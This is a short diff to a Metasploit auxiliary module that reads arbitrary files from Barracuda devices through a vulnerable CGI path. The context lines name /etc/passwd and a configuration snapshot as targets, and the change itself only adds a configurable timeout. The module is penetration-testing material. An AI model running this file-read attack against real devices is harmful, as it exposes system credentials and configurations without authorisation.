@@ -39,12 +39,17 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(8000),
         OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", '/mail/snapshot/config.snapshot']),
         OptString.new('URI', [true, 'Barracuda vulnerable URI path', '/cgi-mod/view_help.cgi']),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the device to respond", 25])
       ], self.class)
   end
 
   def target_url
     uri = normalize_uri(datastore['URI'])
     "http://#{vhost}:#{rport}#{uri}"
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
@@ -58,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
       {
         'method'  => 'GET',
         'uri'     => uri + payload,
-      }, 25)
+      }, timeout)
 
     if res.nil?
       print_error("#{target_url} - Connection timed out")
